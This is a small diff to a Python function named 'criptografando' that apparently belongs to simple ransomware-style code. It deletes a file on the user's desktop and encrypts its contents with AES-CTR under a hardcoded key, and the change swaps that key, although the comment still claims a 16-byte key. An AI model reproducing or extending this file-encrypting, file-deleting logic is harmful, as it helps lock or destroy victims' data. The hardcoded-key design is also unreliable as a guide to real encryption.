@@ -27,7 +27,7 @@ def criptografando():
             f.close()
 
             os.remove(f'{desktop}\\{format_file}')
-            key = b"1ab2c3e4f5g6h7i8"  # 16 byts key - chave
+            key = b"102efd86a2bec382e7945002e53505a7"  # 16 byts key - chave
             aes = pyaes.AESModeOfOperationCTR(key)
             crypto_data = aes.encrypt(file_data)
 
